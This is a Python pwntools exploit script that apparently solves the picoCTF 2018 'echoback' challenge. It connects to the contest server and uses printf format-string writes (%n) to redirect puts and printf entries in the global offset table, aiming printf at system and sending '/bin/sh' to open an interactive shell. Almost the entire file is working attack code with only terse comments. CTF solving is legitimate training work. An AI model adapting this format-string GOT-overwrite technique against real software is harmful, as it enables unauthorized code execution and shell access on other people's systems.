#!/usr/bin/env python

from pwn import *

pico = 1

if pico:
	r = remote("2018shell2.picoctf.com", 56800)
else:
	#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./pico32.libc.so.6")}
	env = {"PWD": "/home/john/Downloads", "SHLVL":"0"}
	r = process("./echoback",env=env)
	gdb.attach(r, '''
		b *0x08048609
		c
		''')


VULN		= 0x080485ab
LEAK 		= 0xf7fb8a70
SYSTEM 		= 0xf7e11da0
PRINTF_GOT 	= 0x0804a010
PUTS_GOT 	= 0x0804a01c

# input offset 7
# stack offset 1
# libc offset 3

# simple overwrite!

r.recvuntil(":")

payload = ''
payload += '%4$p'.ljust(8) # leak libc
payload += p32(PUTS_GOT)
payload += '%{}x%9$hn'.format(0x85ab - (16+2)) # redirect puts() to vuln()
r.sendline(payload)

buf = r.recvuntil(":").replace(" ", "").split('\x1c')[0]
buf = int(buf, 16)
log.info("leak: " + hex(buf))
# buf = buf - (LEAK - SYSTEM)

buf = 0x8048460
log.info("system: " + hex(buf))



high = buf >> 16
low = buf & 0xffff
print 'high: ', hex(high)
print 'write: ', hex(high - low)

payload = ''
payload += p32(PRINTF_GOT+2)
payload += p32(PRINTF_GOT)
payload += '%{0}x%7$hn%{1}x%8$hn'.format(high - 8, low-high)  # redirect puts() to vuln()
print "payload: ", payload
r.sendline(payload)

r.recvuntil(":")
payload = '/bin/sh\x00'
r.sendline(payload)

r.interactive()